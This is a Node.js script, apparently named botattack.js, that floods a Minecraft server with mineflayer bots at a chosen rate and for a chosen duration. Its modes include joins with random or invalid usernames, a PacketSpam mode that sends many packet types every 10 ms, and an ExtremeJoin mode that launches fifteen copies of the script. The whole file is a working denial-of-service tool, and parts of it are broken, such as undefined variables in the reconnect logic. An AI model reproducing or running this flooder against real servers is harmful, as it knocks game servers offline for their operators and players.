process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
const fs = require('fs');
const mineflayer = require('mineflayer');
const { program } = require('commander');
const { exec } = require('child_process');
const path = require('path');

program
  .requiredOption('--ip <type>', 'Adresse IP du serveur')
  .requiredOption('--bps <type>', 'Bots par seconde')
  .requiredOption('--time <type>', 'Temps en secondes')
  .requiredOption('--protocol <type>', 'Protocole')
  .requiredOption('--method <type>', 'Méthode');

program.parse(process.argv);

const options = program.opts();
const legitNamesFile = path.resolve(__dirname, 'files/method/legitnames.txt');
const invalidNamesFile = path.resolve(__dirname, 'files/method/invalidnames.txt');

let legitNames = [];
let invalidNames = [];

try {
  legitNames = fs.readFileSync(legitNamesFile, 'utf8').split('\n').map(name => name.trim()).filter(name => name);
} catch (err) {
  process.exit(1);
}

try {
  invalidNames = fs.readFileSync(invalidNamesFile, 'utf8').split('\n').map(name => name.trim()).filter(name => name);
} catch (err) {
  process.exit(1);
}

const getRandomName = (names) => {
  const randomIndex = Math.floor(Math.random() * names.length);
  return names[randomIndex];
};

const generateRandomString = (length) => {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
};

const createBot = (bots) => {
  const botOptions = {
    host: options.ip,
    port: 25565,
    version: options.protocol,
    username: options.method === 'LegitNames' ? getRandomName(legitNames) :
              options.method === 'InvalidNames' ? getRandomName(invalidNames) :
              `Hydra_team_${generateRandomString(5)}`,
    skipValidation: true,
  };

  const bot = mineflayer.createBot(botOptions);

  bot.on('login', () => {
    if (options.method === 'Join') {
    }

    if (options.method === 'PacketSpam') {
      setInterval(() => {
        bot._client.write('chat', { message: 'Spam packet' });
        bot._client.write('position', {
          x: bot.entity.position.x + (Math.random() - 0.5),
          y: bot.entity.position.y + (Math.random() - 0.5),
          z: bot.entity.position.z + (Math.random() - 0.5),
          onGround: Math.random() > 0.5
        });
        bot._client.write('held_item_slot', {
          slot: Math.floor(Math.random() * 9)
        });
        bot._client.write('arm_animation', {
          hand: 0
        });
        bot._client.write('client_command', {
          actionId: 1
        });
        bot._client.write('window_click', {
          windowId: 0,
          slot: Math.floor(Math.random() * 45),
          mouseButton: 0,
          action: 1,
          mode: 0,
          item: { present: false }
        });
        bot._client.write('entity_action', {
          entityId: bot.entity.id,
          actionId: Math.floor(Math.random() * 6),
          jumpBoost: 0
        });
        bot._client.write('experience', {
          experienceBar: Math.random(),
          level: Math.floor(Math.random() * 100),
          totalExperience: Math.floor(Math.random() * 10000)
        });
        bot._client.write('update_health', {
          health: Math.random() * 20,
          food: Math.floor(Math.random() * 20),
          foodSaturation: Math.random() * 5
        });
        bot._client.write('position_look', {
          x: bot.entity.position.x + (Math.random() - 0.5),
          y: bot.entity.position.y + (Math.random() - 0.5),
          z: bot.entity.position.z + (Math.random() - 0.5),
          yaw: Math.random() * 360,
          pitch: Math.random() * 180 - 90,
          onGround: Math.random() > 0.5
        });
        bot._client.write('use_entity', {
          target: bot.entity.id,
          mouse: Math.floor(Math.random() * 2),
          x: Math.random(),
          y: Math.random(),
          z: Math.random()
        });
        bot._client.write('teleport_confirm', {
          teleportId: Math.floor(Math.random() * 1000)
        });
        bot._client.write('client_settings', {
          locale: 'en_US',
          viewDistance: 10,
          chatFlags: 0,
          chatColors: true,
          skinParts: 127,
          mainHand: 1
        });
        bot._client.write('update_command_block', {
          location: { x: 0, y: 0, z: 0 },
          command: '/help',
          mode: 0,
          flags: 0
        });
      }, 10);
    }    
  });

  bot.on('end', () => {
    if (options.method === 'DoubleJoin' && retries < 2) {
      setTimeout(() => createBot(index, retries + 1), 5000);
    }
  });

  bot.on('error', (err) => {
  });
};

const startBots = () => {
  const interval = 1000 / options.bps;
  const totalBots = options.bps * options.time;
  let botsCreated = 0;

  const createBots = () => {
    if (botsCreated < totalBots) {
      createBot(botsCreated);
      botsCreated += 1;
      updateProgress();

      setTimeout(createBots, interval);
    }
  };

  const updateProgress = () => {
  };

  createBots();
};

const botattackPath = path.resolve(__dirname, 'botattack.js');

if (options.method === 'ExtremeJoin') {
  for (let i = 0; i < 15; i++) {
    exec(`node "${botattackPath}" --ip ${options.ip} --bps ${options.bps} --time ${options.time} --protocol ${options.protocol} --method Join`, (error, stdout, stderr) => {
      if (error) {
        return;
      }
    });
  }
} else {
  startBots();
}
